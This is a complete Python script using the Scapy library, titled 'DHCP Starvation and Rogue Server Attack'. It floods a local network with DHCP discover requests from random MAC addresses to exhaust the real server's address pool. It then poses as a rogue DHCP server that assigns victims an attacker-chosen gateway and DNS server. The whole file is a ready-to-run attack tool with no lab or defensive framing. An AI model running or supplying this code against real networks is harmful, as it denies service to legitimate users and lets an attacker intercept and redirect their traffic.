#!/usr/bin/env python3
from scapy.all import *
import threading
import random
import time
import argparse

# Configuration
FAKE_GATEWAY = "10.1.0.254"
FAKE_DNS = "8.8.8.8"
FAKE_IP_POOL = ["10.1.0.%d" % i for i in range(200, 250)]
LEASED = set()
STARVATION_REQUESTS = 300  #fake clients for starvation

def mac2str(mac):
    return bytes.fromhex(mac.replace(':', ''))

def starvation(interface):
    print("[*] Starting DHCP starvation phase...")
    conf.checkIPaddr = False
    for i in range(STARVATION_REQUESTS):
        mac = RandMAC()
        dhcp_discover = (
            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
            / IP(src="0.0.0.0", dst="255.255.255.255")
            / UDP(sport=68, dport=67)
            / BOOTP(chaddr=mac2str(str(mac)), xid=random.randint(1, 900000000))
            / DHCP(options=[("message-type", "discover"), ("end")])
        )
        sendp(dhcp_discover, iface=interface, verbose=0)
        if i % 10 == 0:
            print(f"[*] Sent {i+1} DHCP discover packets")
    print("[*] Starvation phase complete. Launching rogue DHCP server...")

def rogue_dhcp(pkt, interface):
    if pkt.haslayer(DHCP):
        dhcp_options = pkt[DHCP].options
        msg_type = None
        for opt in dhcp_options:
            if opt[0] == "message-type":
                msg_type = opt[1]
        if msg_type == 1:  # DHCP Discover
            # Pick an unused IP from the pool
            offered_ip = None
            for ip in FAKE_IP_POOL:
                if ip not in LEASED:
                    offered_ip = ip
                    LEASED.add(ip)
                    break
            if not offered_ip:
                print("[!] No more IPs to offer!")
                return
            xid = pkt[BOOTP].xid
            client_mac = pkt[Ether].src
            print(f"[*] DHCP Discover from {client_mac}, offering {offered_ip}")

            ether = Ether(src=get_if_hwaddr(interface), dst=client_mac)
            ip = IP(src=FAKE_GATEWAY, dst="255.255.255.255")
            udp = UDP(sport=67, dport=68)
            bootp = BOOTP(op=2, yiaddr=offered_ip, siaddr=FAKE_GATEWAY, chaddr=mac2str(client_mac), xid=xid)
            dhcp = DHCP(options=[
                ("message-type", "offer"),
                ("server_id", FAKE_GATEWAY),
                ("lease_time", 43200),
                ("subnet_mask", "255.255.255.0"),
                ("router", FAKE_GATEWAY),
                ("name_server", FAKE_DNS),
                "end"
            ])
            offer_pkt = ether / ip / udp / bootp / dhcp
            sendp(offer_pkt, iface=interface, verbose=0)
            print(f"[*] Sent DHCP Offer to {client_mac}")

        elif msg_type == 3:  # DHCP Request
            requested_ip = None
            for opt in dhcp_options:
                if opt[0] == "requested_addr":
                    requested_ip = opt[1]
            xid = pkt[BOOTP].xid
            client_mac = pkt[Ether].src
            print(f"[*] DHCP Request from {client_mac} for {requested_ip}")

            ether = Ether(src=get_if_hwaddr(interface), dst=client_mac)
            ip = IP(src=FAKE_GATEWAY, dst="255.255.255.255")
            udp = UDP(sport=67, dport=68)
            bootp = BOOTP(op=2, yiaddr=requested_ip, siaddr=FAKE_GATEWAY, chaddr=mac2str(client_mac), xid=xid)
            dhcp = DHCP(options=[
                ("message-type", "ack"),
                ("server_id", FAKE_GATEWAY),
                ("lease_time", 43200),
                ("subnet_mask", "255.255.255.0"),
                ("router", FAKE_GATEWAY),
                ("name_server", FAKE_DNS),
                "end"
            ])
            ack_pkt = ether / ip / udp / bootp / dhcp
            sendp(ack_pkt, iface=interface, verbose=0)
            print(f"[*] Sent DHCP ACK to {client_mac}")

def spoofing(interface):
    print("[*] Rogue DHCP server now listening for requests...")
    sniff(filter="udp and (port 67 or 68)", prn=lambda pkt: rogue_dhcp(pkt, interface), iface=interface, store=0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DHCP Starvation and Rogue Server Attack")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use for the attack")
    args = parser.parse_args()

    # 1. Starvation phase
    starvation(args.interface)
    # 2. Spoofing phase
    spoofing(args.interface)